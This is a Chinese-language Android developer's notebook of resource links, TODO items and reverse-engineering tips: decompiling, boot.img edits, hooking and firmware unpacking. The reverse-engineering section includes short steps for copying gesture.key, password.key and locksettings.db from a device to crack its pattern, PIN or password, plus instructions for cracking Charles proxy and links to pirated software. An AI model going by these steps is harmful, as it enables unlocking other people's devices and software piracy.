# 代码技巧

```texttext
在注释中添加复现路径
把培训做成视频
整理bug并归类???????
微信小程序开发
指纹登录网站
使用ddmlib开发一些工具
    python爬虫
    https://github.com/wistbean/learn_python3_spider
    
    # 爬取 CSDN 上大神的 blog?
    ## python3 ~/github/ResourceBackup/python/csdn.py
    
    反反爬虫
    https://github.com/luyishisi/Anti-Anti-Spider
    
    python学习网站
    https://realpython.com/
    https://www.python-course.eu/python3_course.php
    https://bitbucket.org/

展锐faq
https://unisupport.unisoc.com/faq/getFaqDetialView?id=35216
https://unisupport.unisoc.com/faq/getFaqDetialView?id=53452

学习编写ubuntu程序??

代码生成器？做成AS插件？或网页版？或桌面版？

《C 语言也能干大事》

crash course
https://thecrashcourse.com/
https://www.youtube.com/playlist?list=PL8dPuuaLjXtNlUrzyH5r6jN9ulIgZBpdo
https://www.bilibili.com/video/av21376839/
https://github.com/1c7/Crash-Course-Computer-Science-Chinese
```

## TODO : 基于 scrcpy 做一个电脑上的手机录屏软件

## Android学习

```text
https://github.com/geekxh/hello-algorithm   算法图解
https://github.com/xitu/gold-miner/blob/master/android.md       国外精品文章的翻译
https://www.jianshu.com/p/703794911751          GitHub 上优质项目整理
https://blog.csdn.net/lmj623565791/article/details/44754023     Android 你应该知道的学习资源 进阶之路贵在坚持(国外学习网站)
https://www.wanandroid.com/article/list/0?cid=79        玩android黑科技
https://codelabs.developers.google.com/?cat=Android         google Codelabs 代码实验室
http://hukai.me/android-training-course-in-chinese/index.html?utm_source=androiddevtools&utm_medium=website         Android官方培训课程中文版

## Android学习视频
https://github.com/open-android/Android
https://v.youku.com/v_show/id_XODQ1MjI2MDQ0.html?f=23088492
https://caster.io/
http://www.maiziedu.com/article/28121/
http://yun.itheima.com/map/21.html              黑马
https://www.youtube.com/watch?v=EOfCEhWq8sg     treehouse
https://www.wanandroid.com/blog/show/2561           各大互联网公司对外分享链接汇总
https://www.reddit.com/r/androiddev/                reddit 上的 Android 开发专区
https://plus.hencoder.com/                          hencoder
http://gityuan.com/
https://developer.android.google.cn/docs/       官方 Android 应用开发者文档
https://flutterchina.club/widgets-intro/        Flutter 中文开发者网站
https://ebookfoundation.github.io/free-programming-books/free-programming-books-zh.html#android
https://android-developers.googleblog.com/
https://pangrongxian.github.io/
http://bbs.16rd.com/forum-263-1.html
http://www.codeceo.com/article/tag/android
http://www.iteye.com/
http://www.v2ex.com/
http://www.imooc.com/
http://www.html-js.com/
https://segmentfault.com/t/android
http://gank.io/history
https://github.com/lizhangqu/CoreLink
https://github.com/GcsSloop/AndroidNote?utm_source=gold_browser_extension
https://blog.csdn.net/aqi00/article/details/50012511        Android开发笔记
http://p.codekk.com/            android开源项目集合
https://github.com/luxiaoming   代码GG的github地址
https://github.com/yechaoa/Android-Rapid-Development
https://github.com/yechaoa/Android-Develop-Tips
http://chendongmarch.github.io/
https://kymjs.com/
http://blog.zhaiyifan.cn/
https://blog.csdn.net/zhangbijun1230/article/details/79745654
https://www.cnblogs.com/aademeng/category/962043.html
https://blankj.com/
http://zmywly8866.github.io/
http://www.wxtlife.com/
http://wuxiaolong.me/
http://www.lightskystreet.com/
https://blog.csdn.net/lmj623565791/
https://blog.csdn.net/xyz_lmn
https://blog.csdn.net/lzyzsd/
https://www.trinea.cn/
http://hukai.me/
https://www.cnblogs.com/halzhang
https://www.cnblogs.com/hanyonglu
https://fookwood.com/
https://blog.csdn.net/lilu_leo
https://www.cnblogs.com/qianxudetianxia
https://blog.csdn.net/xiaominghimi
https://blog.csdn.net/hellogv
https://blog.csdn.net/yiyaaixuexi
https://blog.csdn.net/wangjinyu501
https://blog.csdn.net/asce1885
https://blog.csdn.net/qinjuning
https://blog.csdn.net/tangcheng_ok
https://blog.csdn.net/singwhatiwanna
https://over140.cnblogs.com/
https://www.cnblogs.com/daizhj
https://www.cnblogs.com/sunzn
https://jeanboy.blog.csdn.net/
http://www.apkbus.com/blog/
http://martinhan.site/
https://www.jb51.net/Special/508.htm
https://github.com/XXApple/AndroidLibs      Android开源库整理


内核学习
如何去学习，网上资料零零散散，如果系统性的学习那么笔者很不建议[如果自学能力强的忽略] 。那么如何系统性得去学习Android驱动?大家可能了解了 Android的底层其实是Linux驱动，在这里笔者建议如果有想了解或者深入的 可以去购买韦东山的Linux驱动视频，Android framework 深入讲解的视频来看。

Android 10.0 AOSP源码编译：https://edu.csdn.net/course/detail/35479
Android 10.0 根文件系统和编译系统：https://edu.csdn.net/course/detail/35480 

## 系统开发视频
https://blog.csdn.net/m0_37203554/article/details/81357704
http://toutiao.com/item/6432821122323972610/   android系统定制-Vbox及Ubuntu的安装
http://toutiao.com/item/6432823051523457538/   android系统定制-常见Linux命令介绍-上
http://toutiao.com/item/6432826510821818881/   android系统定制-常见Linux命令介绍-下
http://www.365yg.com/item/6434362415713878530/ android系统定制-OpenJDK和依赖包的安装&amp;配置USB访问权限
http://www.365yg.com/item/6434633590172025346/ android系统定制-其他可选配置介绍
http://toutiao.com/item/6434633933505167873/   android系统定制-AOSP源码的下载
http://toutiao.com/item/6434640927519670785/   android系统定制-Repo的工作原理
http://www.365yg.com/item/6435007280990650881/ android系统定制-源码下载的其他配置
http://toutiao.com/item/6435007754082976258/   android系统定制-Nexus驱动的下载安装&amp;源码编译
http://toutiao.com/item/6436594902649274881/   android系统定制-编译结果展示&amp;刷机介绍&amp;Android系统分区&amp;out目录介绍
http://toutiao.com/item/6436590437795889665/   android系统定制-AOSP下的一些常用命令
http://www.365yg.com/item/6436589910819340801/ android系统定制-AOSP常见工作目录介绍
http://www.toutiao.com/i6436361010902204929/   android系统定制-AndroidBuildSystem介绍
http://www.toutiao.com/i6436848445700440578/   android系统定制-系统开发做什么
http://www.toutiao.com/i6436589000256913921/   android系统定制-Android系统启动流程-从Init到Zygote
http://www.toutiao.com/i6436849268975206913/   android系统定制-Android系统启动流程-从system_server到Launcher
http://www.toutiao.com/i6436850885292196353/   android系统定制-修改系统APP后进行编译
http://www.toutiao.com/i6436851843262841346/   android系统定制-Dalvik&amp;ART的区别及ODEX文件介绍
http://www.toutiao.com/i6436852898566504962/   android系统定制-编译时odex化的原因
http://www.toutiao.com/i6436853799767245314/   android系统定制-修改Calclator.apk代码并运行
http://www.toutiao.com/i6436853139567018498/   android系统定制-Framework定制及Mac环境介绍
http://www.toutiao.com/i6436857505522909698/   android系统定制-services.jar&amp;framework.jar的修改与运行
http://www.toutiao.com/i6436857259367596545/   android系统定制-libandroid_runtime.so(JNI层)的修改与运行
http://www.toutiao.com/i6436857357145211394/   android系统定制-liblog.so(native层)的修改与编译
http://www.toutiao.com/i6436859125199536641/   android系统定制-系统开发实战回顾
http://www.toutiao.com/i6436351531619975682/   android系统定制-系统级开发的职业发展
https://github.com/open-android/Android

https://pan.baidu.com/s/1JWmAp30xIBtMUnDxf3jCeQ 密码: ggjp        Android FrameWork底层开发视频全套
https://pan.baidu.com/s/1jGQp8bGWqPIcDaVz-8r2XQ 密码: cjbk    解压密码：www.mukedaba.com_fw   探索Android FrameWork底层开发视频全套

韦东山的Linux驱动视频，Android framework 深入讲解的视频来看。

https://space.bilibili.com/397723494/       千里马学框架
http://bbs.16rd.com/forum-261-1.html        一牛网mtk

## 工具网站
http://gradleplease.appspot.com/#fonttype           查看gradle依赖
https://romannurik.github.io/AndroidAssetStudio/    一个可以生成各种类型图标（launcher, notification, generic, app shortcut icons）的工具集合
https://github.com/amitshekhariitbhu/Android-Debug-Database
https://www.codota.com/         写代码经常会遇到需要从github或者stackoverflow上寻找代码示例的时候，这个插件可以在无需离开IDE就能做这件事情。
https://www.hex-rays.com/products/ida/      逆向大利器

## 进阶学习书籍
https://hacpai.com/article/1563154719934    百度网盘高速下载工具
http://www.ituring.com.cn                   图灵社区下载电子书
http://www.yunpangou.com/                   搜索百度网盘资源
https://github.com/ruanyf/free-books        互联网上的免费书籍
https://yisharepdf.site/topics/android      下载网站     易分享电子资源网（专注于破解软件、游戏、电子书等资源的分享）
https://dylanbai8.github.io/ideahub/#       精品电子书
https://bbs.pediy.com/forum-128-2.htm?orderby=lastpid&digest=0      看雪
https://github.com/fuhmmin/it-ebooks-cn
https://github.com/a001189/dzbook
https://github.com/roseduan/e-book
https://github.com/zouyanjian/techbooks
https://github.com/dengyongstefan/Ebook
https://github.com/fancy88/iBook
https://github.com/skeyboy/kBooks
https://github.com/Walker96/-
https://github.com/jinweime/books
linux系统编程手册pdf
    《Code clean》代码整洁之道
《App研发录》
《Android 音视频开发》
    《HeadFirst设计模式》
    《重构：改善既有代码的设计》
    《Linux内核设计与实现》
    《深入理解Linux内核》
《深入理解Android ***》系列书籍，邓凡平老师写的系列。
    《深入理解Android内核设计思想》
《Android移动性能实战》
    《Android系统源代码情景分析》
《Android源码设计模式》，结合设计模式分析源码
《Android框架揭秘》，底层架构的一本好书
    《Android开发精要-范怀宇》
    《黑客与画家》
    《深入理解Java虚拟机》
《高级Android开发强化实战》
《码农翻身》
    《剑指Offer》
《Android技术内幕：应用卷》
    《Android技术内幕：系统卷》
《高性能Android应用开发》
    《Android C++高级编程 使用NDK》
《FFmpeg从入门到精通》
《音视频开发进阶指南：基于Android与IOS平台的实践》
    《Android应用安全防护和逆向分析》
《Android系统安全和反编译实战》
    《增长黑客》
《深入探索Android热修复技术原理7.3Q》
《神策数据-Android_全埋点技术白皮书》
《Android进阶之光》
    《Android开发艺术探索》
《Android开发进阶 从小工到专家》
《Android 源码设计模式解析与实战》
    《Android内核剖析》
    《写给大忙人看的Java SE 8》
《腾讯Android自动化测试实战》
《Android 进阶揭秘》刘望舒
《Android 系统源代码情景分析》
《深入理解 Android 热修复技术原理》
《Java 并发编程的艺术》
《Java 并发编程实战》
《Java 多线程编程核心技术》
《深入理解 Java 虚拟机》
    《程序员，你伤不起》
    《鸟哥的Linux私房菜：基础学习篇 第四版》https://wizardforcel.gitbooks.io/vbird-linux-basic-4e/content/
《Android内核28讲》
《编程珠玑》
《大话设计模式》
《OpenGL.ES应用开发实践指南 Android卷》
    《算法导论》
    《数据结构与算法分析：Java语言描述》
    《啊哈 算法》
LeetCode(算法题)
https://leetcode.com/
https://leetcode-cn.com/problemset/all/



1、数据结构与算法
入门：《啊哈算法》，《数据结构与算法分析:xx语言描述版》

提升：《编程之美》，《剑指offer》，《程序员代码面试指南：IT 名企算法与数据结构题目最优解》，《算法4》

2、计算机网络
零基础先看《网络是怎样连接的》，之后看《计算机网络自动向上》，这两本足够了。

3、操作系统
感觉看《现代操作系统》就够了，如果零基础，想学操作系统和计算机组成原理，那么可以看《程序是怎样跑起来的》，之后看《现代操作系统》，再之后看《深入理解计算机操作系统》这本天书，这本天书包含了操作系统+计组的知识，挑着看就行。

8、Java
入门：《Java核心技术卷1》

进阶：《Java 编程思想》

多线程：《Java 并发编程的艺术》、《Java并发编程实践》

虚拟机：《深入理解Java虚拟机》

10、Linux
入门：《鸟哥的Linux私房菜》

《图解设计模式》
```

#####################################################################################################
#####################################################################################################
########################################## TODO list begin ##########################################
#####################################################################################################
#####################################################################################################

## TODO : [性能] 使用查表(预运算)的方法进行系统的优化，这个在输入法里面已经有应用

## TODO : [性能] 利用多核并行计算的方法进行系统优化

## TODO : [性能] 流程的优化，把一些经常需要分配回收的内存进行缓存控制

## TODO : 整理思维导图

## TODO : 如何通过代码获取系统FPS数据？

```text
https://blog.csdn.net/jinzhuojun/article/details/10428435
```

## TODO : monkey源码分析？

```text
https://blog.csdn.net/cadi2011/article/details/117486050
```

## TODO : 如何在apk中使用nvram？

## TODO : 整理常用Base类

```text
BaseActivity
BaseAdapter
BaseFragment
```

## TODO : 整理常用工具类

```text
https://github.com/Blankj/AndroidUtilCode/blob/master/utilcode/README-CN.md
https://github.com/BolexLiu/DevNote
文件操作工具类
```

## TODO : 整理报错信息和对应的解决方案

## TODO : 常用默认值的修改(单开一个)

```text
https://blog.csdn.net/zengrunxiu/article/details/83446881   MTK 常用默认值修改(KK之前)
```

## TODO : 整理代码模板, 添加到 gedit 的 snippet 中??

```text
AndroidManifest中的模板
Activity模板
BaseActivity模板
Fragment模板
Service模板
Receiver模板
ContentProvider模板
Adapter模板(ListView+GridView+RecyclerView)
反射模板

startActivity模板
startService模板
sendBroadcast模板
SharedPreference模板
Bitmap解析模板
Http请求模板
Notification模板
File操作模板
```

## TODO : [工具] 学习使用 QAAT 工具???

## TODO : [爬虫] 学习使用 HtmlUnit 抓取网页????

## TODO : [log] 学习 mtklog 的设计方法??

## TODO : 如何查看进程的 uid, gid ???

## TODO : 如何在USER软件上查看布局 HierarchyView ???

## TODO : ARouter ????

## TODO : gradle 加速编译???

## TODO : Android Jetpack?????

## TODO : 自拍杆的原理???自拍杆上的按键键值如何定义??是芯片上定义好的吗? 耳机是怎么实现的? 蓝牙耳机呢?IPhone和Android是怎么做到通用的?

## TODO : VPNService如何使用??

## TODO : javassist AOP框架学习??

## TODO : [工具] JavaPoet???

## TODO : APKAnalyser ???

## TODO : 如何读取文件头信息???

## TODO : [CMD] 能否通过 adb 显示 Toast, Notification ???

## TODO : mcc/mnc 是在哪里从SIM卡中读出来的?

## TODO : 如何读取和修改 SIM 卡里的文件??EF

## TODO : [工具] 写个工具读取NVRAM(IMEI,barcode)??

## TODO : 如何通过AT命令读取IMEI??

## TODO : 如何自定义AT命令???怎么发送??怎么接收处理??

## TODO : webview 是个什么应用?和chromewebview有什么区别?

## TODO : 如何在O,P,Q,R,S系统上使用反射调用hide的方法和变量??

## TODO : 怎么用make menuconfig方式配置linux内核kernel??

## TODO : [开源] gRPC 调用 ?? <https://doc.oschina.net/grpc?t=58008>

## TODO : [工具] 学习使用 Packet Capture 和 Debug Proxy 工具抓包，Fiddler 等 pc 端工具抓包

## TODO : [Snippet] 通过handler处理长按的消息????

## TODO : QEMU 的学习和使用??

## TODO : Protocol Buffer 在Android中的应用???

## TODO : 如何用 HierarchyView 定位鼠标点击某点的坐标，RGB ???

## TODO : Android Realm编码开发

## TODO : 研读 Android 英文原版文档

## TODO : Android 批量生成插入短信???

## TODO : PQ参数 ????

## TODO : 如何模拟开关机动画??

## TODO : 开关机动画流程分析

## TODO : 在 Android.mk 中两个模块相互 override 的时候会发生什么??

## TODO : [工具] 开发屏幕上显示log的工具?? 参考AutoJS的 floating window log 显示？

## TODO : [工具] Ettercap 怎么用??可以监听网络请求??

## TODO : Redmine 在 AndroidStudio 中的集成??在自动化工具中集成??

## TODO : FaceBook buck 构建系统

## TODO : [prop] 如何追踪是哪个文件/进程/线程去set SystemProperty?

## TODO : [prop] 通过代码修改 vendor.gsm.serial 失败??

## TODO : [prop] persist值的保存读取?权限问题

## TODO : NFC 相关

```text
https://blog.csdn.net/zhangbijun1230/article/details/82589171
https://blog.csdn.net/zhangbijun1230/article/details/82589034
https://blog.csdn.net/zhangbijun1230/article/details/82588816
https://blog.csdn.net/zhangbijun1230/article/details/82588770
https://blog.csdn.net/zhangbijun1230/article/details/82586436
https://blog.csdn.net/zhangbijun1230/article/details/82586391
```

## TODO : Android 保活技巧

```text
https://blog.csdn.net/zhangbijun1230/article/details/82586391
https://blog.csdn.net/zhangbijun1230/article/details/81638694
https://blog.csdn.net/zhangbijun1230/article/details/81638669
https://blog.csdn.net/zhangbijun1230/article/details/81638600
```

## TODO : ODM 开发用户常见需求文档

```text
https://blog.csdn.net/zhangbijun1230/article/details/80821483   八
https://blog.csdn.net/zhangbijun1230/article/details/80821494   九
https://blog.csdn.net/qq_30796789/article/details/72459556      Android7.0 MTK 需求文档（二）
https://blog.csdn.net/qq_30796789/article/details/53782091      Android6.0 MTK 需求文档（六）
```

## TODO : [OTA] Android 7.0 之后的 ota 升级方式 A/B system

```text
https://blog.csdn.net/guyongqiangx/article/details/71334889
https://blog.csdn.net/guyongqiangx/article/details/71516768
https://blog.csdn.net/guyongqiangx/article/details/72480154
https://blog.csdn.net/guyongqiangx/article/details/72604355
```

## TODO : [debug] ANR 问题一般解决思路

```text
https://mp.weixin.qq.com/s/kT0hZaYRlW9X8fIVEQKJLQ

https://blog.csdn.net/kongbaidepao/article/details/83088650
```

## TODO : Burp Suite 网络监测套件

```text
http://portswigger.net/burp/download.html
```

## TODO : 静态代码分析

```text
CheckStyle
FindBugs
PMD
Lint
```

## TODO : 自动化测试套件

```text
Robolectric
模拟测试框架 mockito
MonkeyRunner
UIAutomator
robotium
espresso
appium
AutoJs
```

## TODO : shadow 是什么东西?

```text
Shadow是通过字节码编辑技术向插件插入中间层，完成插件技术的核心工作的
```

## TODO : Toast的显示时长为什么是固定的???有什么方法可以修改??

```text
在 Toast.java 中有 @interface Duration 的注解，规定只能用 LENGTH_SHORT = 4000 和 LENGTH_LONG = 7000
/** @hide */
@IntDef({LENGTH_SHORT, LENGTH_LONG})
@Retention(RetentionPolicy.SOURCE)
public @interface Duration {}

TODO : 用反射的方式是否可以修改??
```

## TODO : [重点] Android Q 图形系统

```text
https://blog.csdn.net/qq_34211365/article/details/106354607
https://blog.csdn.net/qq_34211365/article/details/106503902
https://blog.csdn.net/qq_34211365/article/details/106524701
https://blog.csdn.net/qq_34211365/article/details/106588430
https://blog.csdn.net/qq_34211365/article/details/106709409
https://blog.csdn.net/qq_34211365/article/details/106756322
https://blog.csdn.net/qq_34211365/article/details/106782063
https://blog.csdn.net/qq_34211365/article/details/106806215
https://blog.csdn.net/qq_34211365/article/details/107045611
https://blog.csdn.net/qq_34211365/article/details/107077280
https://blog.csdn.net/qq_34211365/article/details/107996767
```

## TODO : 如何模拟sim卡的mcc和mnc

```text
ApnSettings.java 文件中的 initSimState() 方法的最下面添加一行代码 mNumeric = "21403";就可以模拟了
现在有专门的白卡可以写mccmnc

TODO : 能否在 AT 命令获取 sim 卡信息的时候直接强制返回想要的 mccmnc?
```

## TODO : MT管理器

## TODO : [开源] 23Code UI动画特效的集中地

## TODO : 如何通过代码获取其他apk中的资源

## TODO : 反射调用其他APK包里面的方法

## TODO : 研究 HierarchyView 的工作原理

## TODO : [知识点] RCS

## TODO : [签名] 为什么系统apk已经有system签名了，再安装第三方的时候不会报签名异常呢？

#####################################################################################################
#####################################################################################################
########################################### Todo list end ###########################################
#####################################################################################################
#####################################################################################################

#####################################################################################################
#####################################################################################################
########################################### 逆向 begin ###############################################
#####################################################################################################
#####################################################################################################

## TODO : [工具]  [逆向] 长连接抓包 anyproxy

## TODO : [逆向] 学习 xposed 和 dexposed 的框架开发插件

## [知识点]  [逆向] 反编译+反汇编

```text
这里说的反编译是指：将 class 文件反编译成 Java 源码的过程。
这里说的反汇编是指：将 class 文件反解析为更可读的虚拟机指令的过程。

反编译工具
https://www.jianshu.com/p/f25c6f8b1594
http://www.decompiler.com/
http://www.javadecompilers.com/
https://github.com/deathmarine/Luyten
```

## [逆向]  [工具] 抓包工具charles神器

```text
1.下载
官方：https://www.charlesproxy.com
其他网站：https://www.52pojie.cn/thread-619994-1-1.html
需要破解，破解文件以及破解方法：Windows平台,将下载的charles.jar文件覆盖到安装目录下的lib文件夹下即可完成破解。Mac 平台,将下载的charles.jar文件右键 Charles.app 显示包内容,覆盖到Content->Java下即可完成破解。
最新版v4.2.0破解文件下载:链接: https://pan.baidu.com/s/1sl4YMK1 密码: b8cy

2.安装
省略

3.配置
a、 启用proxy代理，proxy菜单下勾选启用proxy
b、 安装charles root 证书或模拟器证书。菜单help>SSL Proxying
c、 设置http proxy代理
f、 本机为wifi热点，手机端设置代理，于模拟器方式设置代理相同。

4.使用
```

## [逆向] 打开android debug设备系统调试

```text
1. 修改boot.img
不歪同学在 http://bbs.pediy.com/showthread.php?t=197334 这篇帖子中提到修改boot.img，从而打开系统调试，这样就可以省去给app添加android:debuggable="true"，再重打包的步骤了。（这个方法不歪同学讲的很详细了，我就不展开了）
一、下载“Google Nexus 5 谷歌最新官方原厂安卓4.4.4固件”，从这个ROM中提取出boot.img文件。

二、boot.img解包
运行下面的命令将会对boot.img解包，得到boot.img-kernel和boot.img-ramdisk.gz两个文件：
split-bootimg.pl boot.img

三、处理boot.img-ramdisk.gz
运行下面的命令，对boot.img-ramdisk.gz进行解压：
mkdir ramdisk
cd ramdisk
gzip -dc ../boot.img-ramdisk.gz | cpio -i

四、修改default.prop，打开系统调试标志
找到解压出来的default.prop文件，将其中的ro.debuggable=0修改为ro.debuggable=1

五、ramdisk目录打包
返回ramdisk的上层目录，输入命令：
mkbootfs ./ramdisk | gzip > ramdisk.img

六、打包出新的boot.img
命令：
mkbootimg --base 0x00000000 --ramdisk_offset 0x02900000 --second_offset 0x00F00000 --tags_offset 0x02700000 --cmdline 'console=ttyHSL0 androidboot.hardware=hammerhead user_debug=31 maxcpus=2 msm_watchdog_v2.enable=1 earlyprintk' --kernel boot.img-kernel --ramdisk ramdisk.img -o newboot.img

七、将新的boot.img刷入手机
这时，在windows下还是linux下就无所谓了。将手机连上电脑输入下面的命令，重启手机进入fastboot：
adb reboot bootloader
当重启手机后，将新的boot.img刷入手机：
fastboot flash boot newboot.img
如果出现类似下图的输出，就说明刷入成功了：


刷入成功并不代表你的手机可以正常使用~~不过只要严格按照上面的方法，在Nexus5这个手机下还是没有问题的。现在输入下面的命令重启手机吧：
fastboot reboot

八、系统中的APP都可以调试了！
APP调试命令：adb shell am start -D -n <包名>/<Activity名>

2. 直接修改系统属性
使用setpropex工具在已经root的设备上修改只读的系统属性。使用此工具来修改ro.secure和ro.debuggable的值。
工具地址：https://github.com/poliva/rootadb

如果需要调试长期存在系统中的服务和进程等，那么我们可以强制重启android的Dalvik层，可以简单的结束system_server进程。
```

## [逆向] 屏蔽广告的一种方案:修改了系统的/etc/hosts文件。让广告域名都指向本机IP地址

## [逆向] 如何简单修改Android的so文件 - 限于修改字符串常量

```text
场景
有的时候需要定制Android默认蓝牙设备名称，当然在我们有源码的情况下自然是很好处理，但如果没有源码呢?这时候就需要修改so文件了。

蓝牙默认设备名称的修改在：
frameworks\base\core\jni\Android_bluetooth_common.h

主要就是修改BTMTK_ANDROID_DEFAULT_LOCAL_NAME的值

#define BTMTK_ANDROID_DEFAULT_LOCAL_NAME "ANDROID BT"

查看相关mk文件可以知道，该文件最终编译到了libandroid_runtime.so中，所以我们直接找到编译好的libandroid_runtime.so

工具
WinHex

该工具是一款非常不错的 16 进制编辑器，得到 ZDNetSoftwareLibrary 五星级最高评价，拥有强大的系统效用。

(PS:按F3查找下一个)

方法
将libandroid_runtime.so载入到WinHex中，然后全文搜索ANDROID BT，理论上只会有一处，当然也不能排除有多处，最终定位到代码如下：

00684736 | 73 31 35 00 48 49 4B 65  20 37 31 36 00 5B 47 41 | s15 ANDROID BT

在WinHex中我们可以搜到仅有一处定义，因此直接修改为自己想定义的名称，完成之后点击保存，重新push到设备中，重启设备即可生效
```

## [逆向] 解决HierarchyViewer不能连接真机的问题

```text
https://blog.csdn.net/autumn_xl/article/details/40741835
```

## [逆向] hook OnClickListener

```text
public class HookView {
  public static void hookOnClickListener(View view) {
    try {
      // 通过反射获取到 getListenerInfo() 方法
      @SuppressLint("DiscouragedPrivateApi")
      Method getListenerInfo = View.class.getDeclaredMethod("getListenerInfo");
      // 设置访问权限
      getListenerInfo.setAccessible(true);
      // 调用 view 的 getListenerInfo() 获取到 ListenerInfo
      Object listenerInfo = getListenerInfo.invoke(view);

      // 通过反射获取到 ListenerInfo 的 Class 对象
      @SuppressLint("PrivateApi")
      Class<?> listenerInfoClass = Class.forName("android.view.View$ListenerInfo");
      // 获取到 mOnClickListener 成员变量
      Field mOnClickListener = listenerInfoClass.getDeclaredField("mOnClickListener");
      // 设置访问权限
      mOnClickListener.setAccessible(true);
      // 获取 mOnClickListener 属性的值
      View.OnClickListener originOnClickListener = (View.OnClickListener) mOnClickListener.get(listenerInfo);

      // 创建 OnClickListener 代理对象
      HookedOnClickListener hookedOnClickListener = new HookedOnClickListener(originOnClickListener);
      // 为 mOnClickListener 属性重新赋值
      mOnClickListener.set(listenerInfo, hookedOnClickListener);
    } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException | ClassNotFoundException | NoSuchFieldException e) {
      e.printStackTrace();
    }
  }

  static class HookedOnClickListener implements View.OnClickListener {

    private final View.OnClickListener origin;

    HookedOnClickListener(View.OnClickListener origin) {
      this.origin = origin;
    }

    @Override
    public void onClick(View v) {
      Log.e("HookedOnClickListener", "onClick");
      if (origin != null) {
        origin.onClick(v);
      }
    }
  }
}

btn_test.setOnClickListener(new View.OnClickListener() {
    @Override
    public void onClick(View v) {
        Toast.makeText(v.getContext(), "Button Click", Toast.LENGTH_SHORT).show();
    }
});

// hook onClickListener
HookView.hookOnClickListener(btn_test);


Native Hook
Android Native Hook 主要分为两种：PLT Hook、Inline Hook。

我对 Native 开发不熟，这里仅仅做下了解。以下章节摘自Android Native Hook技术路线概述。

PLT Hook
```

## [逆向] 工具合集

```text
刷机包
sparse img -> ext4 img
线刷包里面找到system.img/vendor.img

$ file system.img
system.img: Android sparse image, version: 1.0, Total of 849920 4096-byte output blocks in 2454 input chunks.
使用Android源码编译make simg2img得到out/host/linux-x86/bin/simg2img即可将Android的sparse image转为ext4的image

super img -> super ext4 img -> system product vendor ext4 img
预装Android 10的机型一般使用动态分区
线刷包里面找到super.img
使用simg2img将super.img转为super_ext4.img
使用Android源码编译make lpunpack得到out/host/linux-x86/bin/lpunpack super_ext4.img super

dat -> ext4 img
卡刷包中的system.new.dat.br转system.new.dat
brotli –decompress system.new.dat.br –output=system.new.dat

卡刷包中的system.new.dat system.patch.dat system.transfer.list转ext4 img
https://github.com/xpirt/sdat2img

payload dump
AB分区卡刷包相关
https://github.com/cyxx/extract_android_ota_payload

odex/oat/vdex
Android <=4.4 odex to dex

https://github.com/JesusFreke/smali/wiki/DeodexInstructions
https://bitbucket.org/JesusFreke/smali/downloads/

Android <=7 oat to dex

https://github.com/testwhat/SmaliEx/releases
https://github.com/testwhat/SmaliEx
https://github.com/JesusFreke/smali/wiki/DeodexInstructions
https://bitbucket.org/JesusFreke/smali/downloads/

Android 8 vdex to dex

https://github.com/anestisb/vdexExtractor

Android 9 vdex->cdex->dex

https://github.com/anestisb/vdexExtractor
https://github.com/anestisb/vdexExtractor/issues/23
tools/deodex/run.sh -h

dex
dex转smali
apktool工具 针对 apk包括dex和资源

https://github.com/iBotPeaches/Apktool
https://ibotpeaches.github.io/Apktool/

baksmali、smali 针对dex

https://github.com/JesusFreke/smali
https://bitbucket.org/JesusFreke/smali/downloads/

dex转jar/java
googe enjarify工具dex转jar

https://github.com/google/enjarify

dex2jar

https://github.com/pxb1988/dex2jar
https://github.com/pxb1988/dex2jar/releases

结合jd-gui

https://github.com/java-decompiler/jd-gui
http://jd.benow.ca/

二合一工具
https://github.com/skylot/jadx
```

## TODO : [逆向] Android 逆向?

```text
https://blog.csdn.net/qq_36869808/article/details/78999010
```

## TODO : [逆向] 代码反混淆simplify

```text
https://github.com/CalebFenton/simplify
```

## TODO : [逆向] FDex2脱壳(腾讯乐固、360加固一键脱壳)

```text
https://zhuanlan.zhihu.com/p/45591754
```

## TODO : [逆向] Firda hook

```text
https://blog.csdn.net/weixin_39190897/article/details/91979456
```

## TODO : [逆向] 深入Android源码系列（二） HOOK技术大作战

```text
https://mp.weixin.qq.com/s?__biz=MzI1MjMyOTU2Ng==&mid=2247484652&idx=1&sn=7795db9405e1ed1594d751410ddb7c7a&chksm=e9e42fddde93a6cbc29e56518b38dbd4ebf86aafe299d1f0dcd80a1397d9bdfbd814c18d0111&scene=21#wechat_redirect
```

## [逆向] 安装使用 drozer

```text
drozer console connect

list

// 获取 apk 安装信息
run app.package.list -a com.android.launcher3

// 查看 apk 存在的安全隐患
run app.package.attacksurface com.android.launcher3
run app.activity.info -a com.android.launcher3
run app.activity.start --component com.android.launcher3 com.android.launcher3.Launcher
```

## [逆向] 破解手势解锁密码??

```text
cp /data/system/gesture.key /mnt/sdcard
adb pull /mnt/sdcard/gesture.key
grep -i `xxd -p gesture.key` AndroidGestureSHA1.txt  //AndroidGestureSHA1.txt 这个文件怎么写的???
```

## [逆向] 破解PIN码和PASSWORD码??

```text
cp /data/system/password.key /mnt/sdcard/
cp /data/system/locksettings.db /mnt/sdcard/

用 hex editor(Hex workshop) 打开 password.key 文件，得到一串 hashcode

用 sqlite3 查看 locksettings.db 数据库，得到 salt

12|lockscreen.password_salt|0|6305598215633793568

到 http://www.cclgroupltd.com/product/android-pin-password-lock-tool/ 下载 BruteForceAndroidPin.py 工具

Python BruteForceAndroidPin.py [hash]  [salt]  [max_length_of_PIN] 
```

## [逆向] 无需刷机，查看rom包内的文件

```text
静态调试
有时候为了确认系统内某些文件是否存在、是否编译了odex、反编译apk、反编译oat等，查看一些静态信息的时候，一般我们都会找一个机器通过flash_all，再等开机后adb 进去查看。这样一来很浪费时间，其实我们完全可以将system.img mount到本地pc上查看。

1）下载对应的rom包。
2）本地解压后找到对应的system.img。
3）通过本地编译时提供的host小工具命令simg2img（一般位于out/host/linux-x86/bin下）将system.img转化为raw img文件。simg2img system.img s.raw
4）本地创建挂载点目录，如mkdir system-host，接着直接通过mount s.raw system-host即可（注意mount需要root权限）。
5）挂载成功后，system-host就跟手机上system分区一模一样。
```

## [逆向] 反调试

```text
方案策略总结
下面简单几句话总结这几种方案：
第一、自己附加进程，先占坑，ptrace(PTRACE_TRACEME, 0, 0, 0)！
第二、签名校验不可或缺的一个选择，本地校验和服务端校验双管齐下！
第三、借助系统api判断应用调试状态和调试属性，最基础的防护！
第四、轮训检查android_server调试端口信息和进程信息，防护IDA的一种有效方式！
第五、轮训检查自身status中的TracerPid字段值，防止被其他进程附加调试的一种有效方式！
```

## [逆向] 逆向实战(破解恶意勒索软件)

```text
https://blog.csdn.net/ALDYS4/article/details/92376145
```

## [逆向] 反编译工具

```text
Smali + Baksmali
Androguard
jeb
Radare2
IDA Pro
Hex-Rays
dexopt
jadx
